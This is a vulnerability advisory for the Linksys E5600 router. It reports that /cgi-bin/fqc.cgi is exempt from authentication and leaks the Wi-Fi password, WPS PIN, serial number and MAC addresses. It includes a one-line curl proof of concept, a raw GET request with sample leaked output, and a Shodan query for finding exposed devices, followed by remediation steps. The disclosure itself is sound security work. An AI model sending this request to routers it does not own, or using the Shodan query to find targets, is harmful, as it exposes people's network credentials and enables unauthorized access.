
# Linksys E5600 fqc.cgi Unauthenticated Information Disclosure

## Vulnerability Information

**Product**: Linksys E5600 (E5600 v1) Wi-Fi Router  
**Firmware version**: FW_E5600_1.1.0.26_prod.img (OpenWrt Chaos Calmer 15.05.1 / Linux 3.10.108 / MT7621)  
**Firmware date**: 2021-11-27  
**Vulnerable endpoint**: `/cgi-bin/fqc.cgi`  
**Patched version**: None identified  
**Reporter**：Cl0uds (Zhang Yun),Yang Guanzhi,Deng Meiling from YNTEC Xvullab 

---

## Summary

An unauthenticated information disclosure vulnerability exists in the Linksys E5600 router's web interface. The CGI endpoint `/cgi-bin/fqc.cgi` exposes sensitive device information — including the **Wi-Fi password (PSK)**, **WPS PIN**, LAN/WAN/MAC addresses, serial number, default SSID, and factory configuration — without requiring any authentication. An attacker with network access to the router's web interface can retrieve this information with a single HTTP GET request.

---

## Details

### Vulnerability: Unauthenticated Information Disclosure (CVSS 6.5 Medium)

**CWE**: CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)  
**CVSS Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`

The file `/www/cgi-bin/fqc.cgi` is a POSIX shell script that executes a series of system commands to collect device configuration data and outputs it as HTML. The endpoint is explicitly excluded from Lighttpd's session authentication module in the `session.exception-uri` configuration:

```
session.exception-uri = ( "login.html", "login.cgi", "login_s.cgi", "crossecho.html", "fqc.cgi" )
```

This means **no session cookie is required** to access this endpoint. The script collects and displays:

| Data Exposed | Source Command |
|-------------|---------------|
| **Wi-Fi Password (WPA2 PSK)** | `objReq wlanSecurity show \| grep wpaPsk` |
| **WPS PIN (8-digit)** | `objReq wlanWps show \| grep routerPIN` |
| **2.4GHz SSID** | `iwconfig ra0 \| grep ESSID` |
| **5GHz SSID** | `iwconfig rai0 \| grep ESSID` |
| **LAN MAC Address** | `/sys/class/net/br-lan/address` |
| **WAN MAC Address** | `/sys/class/net/eth1/address` |
| **2.4G WiFi MAC** | `/sys/class/net/ra0/address` |
| **5G WiFi MAC** | `/sys/class/net/rai0/address` |
| **Serial Number** | `gcontrol di get serial_number` |
| **Model Number** | `gcontrol di get modelNumber` |
| **Firmware Version** | `/etc/version` |
| **Factory Default SSID** | `gcontrol di get default_ssid` |
| **Factory Default Wi-Fi Password** | `gcontrol di get default_passphrase` |
| **Boot Mode / Partition** | `gcontrol uenv get ManufactureMode` |
| **Region** | `objReq wlanMpt show` |

### Root Cause

The Lighttpd web server configuration explicitly exempts `fqc.cgi` from session authentication (`session.exception-uri`), presumably for factory quality control (FQC) testing purposes, but this exemption was unintentionally left enabled on production firmware.

### Proof of Concept

```bash
curl "http://<router_ip>/cgi-bin/fqc.cgi"
```

Response contains sensitive data including:

```html
<p class='content'>Firmware Version: 1.1.0.26 </p>
<p class='content'>Module Name: E5600 </p>
<p class='content'>Serial Number: ABCDEF123456 </p>
<p class='content'>Label MAC: AABBCCDDEEFF </p>
<p class='content'>Default wifi password: MyWiFiPassword </p>
<p class='content'>Default WPS PIN: 12345678 </p>
<p class='content'>2.4G ESSID: MyNetwork </p>
```

### Burp Suite Request

```http
GET /cgi-bin/fqc.cgi HTTP/1.1
Host: <router_ip>
```
<img width="642" height="1024" alt="Untitled" src="https://github.com/user-attachments/assets/a68a1d1d-2802-49a3-bed3-424a41520af6" />

---

## Impact

An unauthenticated attacker with network access to the router can obtain:

1. **Wi-Fi network credentials** (WPA2 PSK) — allowing unauthorized access to the wireless network, bypassing all network-level access controls
2. **WPS PIN** — enabling WPS PIN brute-force attacks or simplified network access via WPS protocol
3. **Device serial number and MAC addresses** — enabling device tracking, potential warranty fraud, or targeted attacks
4. **Factory default SSID and passphrase** — which often match the Wi-Fi password on unconfigured devices; may also be used for social engineering attacks

---

## Affected Products

Based on the driver bundle analysis:

| Model | Tested Firmware |
|-------|----------------|
| Linksys E5600 (v1) | 1.1.0.26 and other version|

Other Linksys routers sharing the same codebase (based on OpenWrt Chaos Calmer with similar CGI architecture) may also be affected.

---

## Remediation

### Immediate Mitigations

1. **Remove fqc.cgi from the webroot** or restrict access:
   ```bash
   rm /www/cgi-bin/fqc.cgi
   ```
2. **Remove fqc.cgi from the session.exception-uri** list in Lighttpd configuration (`/etc/lighttpd/lighttpd.conf`)
3. **Change Wi-Fi password** and WPS PIN via the router's administration interface
4. **Restrict remote access** to the router's web interface (port 80/443) from WAN side

### Vendor Action Required

Linksys should:
- Remove factory test endpoints (`fqc.cgi`, `debugmsg.cgi`) from production firmware
- Revert all `session.exception-uri` entries to the minimum required set
- Implement proper access control for diagnostic endpoints

---

## Timeline

- **2021-11-27**: Firmware compiled with `fqc.cgi` left in `session.exception-uri`
- **2026-07-14**: Vulnerability discovered by Xvullab during firmware security analysis

---

## References

- Linksys Official Site: https://www.linksys.com
- CWEs: [CWE-200: Exposure of Sensitive Information](https://cwe.mitre.org/data/definitions/200.html)
- Shodan Search: `"E5600" port:80`
